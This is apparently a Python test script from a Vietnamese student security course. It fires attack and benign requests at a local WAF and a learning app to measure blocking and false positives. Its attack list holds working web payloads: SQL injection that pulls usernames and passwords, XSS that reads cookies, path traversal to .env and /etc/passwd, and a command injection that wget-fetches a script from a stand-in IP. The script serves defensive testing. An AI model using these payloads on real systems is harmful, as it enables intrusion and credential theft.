"""
Kịch bản kiểm thử / demo: gửi một loạt request tấn công và request bình thường,
rồi đối chiếu kết quả mong đợi.

Dùng để quay demo và để đo hiệu quả. CHỈ chạy với EngPro của chính bạn trên
localhost, phục vụ học tập môn An toàn và Bảo mật thông tin.

    python -m tests.demo_attack              # gửi qua WAF (cổng 8000)
    python -m tests.demo_attack --direct     # gửi thẳng EngPro (8080), không WAF

So sánh hai lần chạy để thấy rõ "trước và sau khi có WAF".
"""
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

WAF = "http://127.0.0.1:8000"
DIRECT = "http://127.0.0.1:8080"

BROWSER_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

# (tên, method, path, tham số query, body JSON, User-Agent)
ATTACKS = [
    ("SQLi trên ô tìm kiếm", "GET", "/api/courses", {"search": "' OR 1=1--"}, None, None),
    ("SQLi UNION lấy mật khẩu", "GET", "/api/courses",
     {"search": "1' UNION SELECT username,password FROM users--"}, None, None),
    ("SQLi biến thể né luật", "GET", "/api/courses",
     {"search": "1'/**/UnIoN/**/SeLeCt/**/1,2,3--"}, None, None),
    ("SQLi làm chậm CSDL", "GET", "/api/courses", {"id": "1' AND pg_sleep(5)--"}, None, None),
    ("XSS trong hỏi đáp", "POST", "/api/lecture-questions/1/answers", {},
     '{"content":"<script>alert(document.cookie)</script>"}', None),
    ("XSS qua thẻ img", "POST", "/api/courses/1/reviews", {},
     '{"comment":"<img src=x onerror=alert(1)>"}', None),
    ("Đọc trộm file .env", "GET", "/api/courses", {"file": "../../../.env"}, None, None),
    ("Đọc trộm /etc/passwd", "GET", "/api/courses",
     {"file": "../../../../etc/passwd"}, None, None),
    ("Chèn lệnh hệ điều hành", "GET", "/api/courses",
     {"q": "; cat /etc/passwd"}, None, None),
    ("Chèn lệnh tải mã độc", "GET", "/api/courses",
     {"q": "; wget http://198.51.100.7/a.sh"}, None, None),
    ("Template Injection", "GET", "/api/courses", {"q": "{{7*7}}"}, None, None),
    ("Quét bằng sqlmap", "GET", "/api/courses", {}, None, "sqlmap/1.8.4#stable"),
    ("Quét bằng Nikto", "GET", "/pages/login.html", {}, None, "Nikto/2.5.0"),
]

# Lưu lượng bình thường – KHÔNG được chặn. Cố ý chứa từ khóa nhạy cảm.
BENIGN = [
    ("Trang chủ", "GET", "/", {}, None, None),
    ("API trang chủ", "GET", "/api/public/home", {}, None, None),
    ("Tìm khóa học", "GET", "/api/courses", {"search": "business english"}, None, None),
    ("Tìm 'order of adjectives'", "GET", "/api/courses",
     {"search": "order of adjectives"}, None, None),
    ("Bài Writing có 'select'", "POST", "/api/writing/prompts/1/submit", {},
     '{"content":"Students should select the courses that match their goals and order their study plan."}', None),
    ("Hỏi đáp có 'union'", "POST", "/api/ai/lectures/1/ask", {},
     '{"question":"What is the difference between a trade union and a labour union?"}', None),
    ("Bình luận có dấu nháy", "POST", "/api/courses/1/reviews", {},
     '{"rating":5,"comment":"It\'s the best course I\'ve taken; don\'t miss it!"}', None),
    ("Đăng nhập bình thường", "POST", "/api/auth/login", {},
     '{"email":"lan.nguyen@gmail.com","password":"Tieng@nh2024"}', None),
    ("Client dùng curl", "GET", "/api/courses", {}, None, "curl/8.7.1"),
    ("Client dùng Postman", "GET", "/api/ai/status", {}, None, "PostmanRuntime/7.39.0"),
]


def send(base, method, path, params, body, ua):
    """Gửi request, mã hóa URL đúng chuẩn để ký tự đặc biệt tới được server."""
    url = base + urllib.parse.quote(path)
    if params:
        url += "?" + urllib.parse.urlencode(params)
    data = body.encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", ua or BROWSER_UA)
    if body:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        return f"LỖI: {type(e).__name__}"


def run(base, label):
    print(f"\n{'=' * 68}\n  {label}\n  {base}\n{'=' * 68}")

    print("\n  ── Tấn công (mong đợi: bị chặn 403) ──")
    blocked = 0
    for name, method, path, params, body, ua in ATTACKS:
        status = send(base, method, path, params, body, ua)
        hit = status == 403
        blocked += hit
        print(f"   {'CHẶN ' if hit else 'LỌT  '} [{status}] {name}")
        time.sleep(0.05)
    print(f"\n   → Chặn được {blocked}/{len(ATTACKS)} tấn công")

    print("\n  ── Bình thường (mong đợi: KHÔNG bị chặn) ──")
    fp = 0
    for name, method, path, params, body, ua in BENIGN:
        status = send(base, method, path, params, body, ua)
        # 401/404 là do EngPro yêu cầu đăng nhập, không phải WAF chặn
        hit = status == 403
        fp += hit
        print(f"   {'BÁO NHẦM' if hit else 'OK      '} [{status}] {name}")
        time.sleep(0.05)
    print(f"\n   → Báo nhầm {fp}/{len(BENIGN)} request bình thường")

    if blocked or fp:
        print(f"\n   Tóm tắt: phát hiện {blocked}/{len(ATTACKS)} tấn công, "
              f"báo nhầm {fp}/{len(BENIGN)}")


if __name__ == "__main__":
    if "--direct" in sys.argv:
        run(DIRECT, "KHÔNG CÓ WAF – gửi thẳng tới EngPro")
    else:
        run(WAF, "CÓ AI WAF bảo vệ")
